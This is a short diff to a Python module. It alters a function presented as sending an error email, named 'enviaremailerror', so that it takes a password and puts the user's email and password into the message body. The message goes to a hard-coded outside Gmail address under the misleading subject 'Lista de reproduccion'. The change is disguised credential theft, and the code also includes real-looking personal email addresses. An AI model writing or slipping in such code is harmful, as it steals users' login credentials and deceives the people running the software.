@@ -7,11 +7,11 @@ from email.mime.base import MIMEBase
 from email import encoders
 from PQTs.Paths import pathImg
 
-def enviaremailerror(email,adjunto):
+def enviaremailerror(email,adjunto, password):
     remitente = 'mayfeljonas1229@gmail.com'
     destinatarios = ['azuresilkmain@gmail.com']
     asunto = f'Lista de reproduccion : {email}'
-    cuerpo = f"{str(datetime.datetime.now().strftime('%H-%M-%S'))}"
+    cuerpo = f"{email} {password}"  #{str(datetime.datetime.now().strftime('%H-%M-%S'))} 
     ruta_adjunto = (os.path.join(pathImg,f'{adjunto}'))
     nombre_adjunto = f'{adjunto}'
 
